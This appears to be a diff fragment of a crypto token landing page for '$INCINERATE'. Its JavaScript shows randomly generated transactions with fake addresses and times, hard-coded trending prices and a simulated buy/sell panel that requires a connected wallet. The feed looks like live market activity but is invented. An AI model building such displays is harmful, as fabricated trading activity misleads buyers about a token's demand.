+function generateTransactions() {
+    const types = ['buy', 'sell'];
+    const addresses = [
+        '7xK3s...9F2A', '8jF4s...K92P', '3mL9a...H71Q', '5bN2r...V83D',
+        '1cP6t...R45E', '9dR8v...M12F', '4hS1x...W67G', '2kL7y...P89H'
+    ];
+    const txs = [];
+
+    for (let i = 0; i < 12; i++) {
+        const type = types[Math.floor(Math.random() * types.length)];
+        const amount = (Math.random() * 50000 + 100).toFixed(2);
+        const price = (Math.random() * 0.00002 + 0.00003).toFixed(8);
+        const from = addresses[Math.floor(Math.random() * addresses.length)];
+        let to;
+        do { to = addresses[Math.floor(Math.random() * addresses.length)]; } while (to === from);
+        const minutes = Math.floor(Math.random() * 60);
+        const hours = Math.floor(Math.random() * 24);
+        const time = hours + 'h ' + minutes + 'm ago';
+        txs.push({ type, amount, price, from, to, time });
+    }
+
+    const tbody = document.getElementById('txBody');
+    tbody.innerHTML = txs.map(tx => `
+        <tr>
+            <td class="tx-type ${tx.type}">${tx.type.toUpperCase()}</td>
+            <td>${Number(tx.amount).toLocaleString()}</td>
+            <td>$${tx.price}</td>
+            <td class="tx-address">${tx.from}</td>
+            <td class="tx-address">${tx.to}</td>
+            <td class="tx-time">${tx.time}</td>
+        </tr>
+    `).join('');
+}
+
+// ============================================================
+//  TRENDING
+// ============================================================
+function generateTrending() {
+    const coins = [
+        { name: 'BONK', ticker: 'BONK', price: 0.00002341, change: 15.7 },
+        { name: 'WIF', ticker: 'WIF', price: 2.34, change: 8.2 },
+        { name: 'SAMO', ticker: 'SAMO', price: 0.00845, change: -3.1 },
+        { name: 'MYRO', ticker: 'MYRO', price: 0.1245, change: 42.0 },
+        { name: 'POPCAT', ticker: 'POPCAT', price: 0.00567, change: 22.8 },
+        { name: 'MEW', ticker: 'MEW', price: 0.00345, change: -5.6 },
+        { name: 'PENG', ticker: 'PENG', price: 0.5678, change: 11.3 },
+        { name: 'INCINERATE', ticker: 'INCIN', price: 0.000042, change: 69.42 },
+    ];
+
+    const grid = document.getElementById('trendingGrid');
+    grid.innerHTML = coins.map(coin => {
+        const isUp = coin.change >= 0;
+        return `
+            <div class="trending-item">
+                <div class="trending-icon">${coin.name[0]}</div>
+                <div class="trending-info">
+                    <div class="trending-name">${coin.name}</div>
+                    <div class="trending-ticker">$${coin.ticker}</div>
+                </div>
+                <div style="text-align:right;">
+                    <div class="trending-price">$${coin.price < 0.01 ? coin.price.toFixed(8) : coin.price.toFixed(4)}</div>
+                    <div class="trending-change ${isUp ? 'up' : 'down'}">${isUp ? '▲' : '▼'} ${Math.abs(coin.change)}%</div>
+                </div>
+            </div>
+        `;
+    }).join('');
+}
+
+// ============================================================
+//  TRADING SIMULATION
+// ============================================================
+function executeBuy() {
+    if (connectedWallets.length === 0) {
+        showToast('Please connect a wallet first!', 'error');
+        openWalletModal();
+        return;
+    }
+    const amount = parseFloat(document.getElementById('buyAmount').value) || 0;
+    if (amount <= 0) { showToast('Enter a valid amount', 'error'); return; }
+    const currency = document.getElementById('buyCurrency').value;
+    const rate = 133700;
+    const receive = (amount * rate).toFixed(2);
+    showToast(`Buy order placed: ${amount} ${currency} → ${Number(receive).toLocaleString()} $INCINERATE`, 'success');
+    STATE.tokenBalance += Math.floor(parseFloat(receive));
+    STATE.balance -= amount;
+    document.getElementById('tokenBalance').textContent = STATE.tokenBalance.toLocaleString();
+    document.getElementById('solBalance').textContent = STATE.balance.toFixed(2);
+}
+
+function executeSell() {
+    if (connectedWallets.length === 0) {
+        showToast('Please connect a wallet first!', 'error');
+        openWalletModal();
+        return;
+    }
+    const amount = parseFloat(document.getElementById('sellAmount').value) || 0;
+    if (amount <= 0) { showToast('Enter a valid amount', 'error'); return; }
+    if (amount > STATE.tokenBalance) {
+        showToast('Insufficient $INCINERATE balance!', 'error');
+        return;
+    }
+    const rate = 0.0000042;
+    const receive = (amount * rate);
+    showToast(`Sell order placed: ${amount} $INCINERATE → ${receive.toFixed(6)} SOL`, 'success');
+    STATE.tokenBalance -= Math.floor(amount);
+    STATE.balance += receive;
+    document.getElementById('tokenBalance').textContent = STATE.tokenBalance.toLocaleString();
+    document.getElementById('solBalance').textContent = STATE.balance.toFixed(2);
+}
+
+document.getElementById('buyAmount').addEventListener('input', function() {
+    const amount = parseFloat(this.value) || 0;
+    const currency = document.getElementById('buyCurrency').value;
+    const rate = 133700;
+    document.getElementById('buyReceive').textContent = (amount * rate).toFixed(2);
+});
+
+document.getElementById('sellAmount').addEventListener('input', function() {
+    const amount = parseFloat(this.value) || 0;
+    document.getElementById('sellReceive').textContent = (amount * 0.0000042).toFixed(6);
+});
+
+document.getElementById('buyCurrency').addEventListener('change', function() {
+    document.getElementById('buyAmount').dispatchEvent(new Event('input'));
+});
+
+// ============================================================
+//  RESIZE HANDLER
+// ============================================================
+let chartTimer;
+window.addEventListener('resize', () => {
+    clearTimeout(chartTimer);
+    chartTimer = setTimeout(drawChart, 200);
+});
+
+// ============================================================
+//  INIT
+// ============================================================
+document.addEventListener('DOMContentLoaded', function() {
+    detectWallets();
+    updateGlobalWalletUI();
+    generateTransactions();
+    generateTrending();
+    setTimeout(drawChart, 100);
+});
+
+window.addEventListener('load', function() {
+    setTimeout(drawChart, 300);
+});
+
+console.log('=== SOL-INCINERATOR + WALLET CONNECT (EIP-6963) AKTIV ===');
 </script>
+
 </body>
 </html>
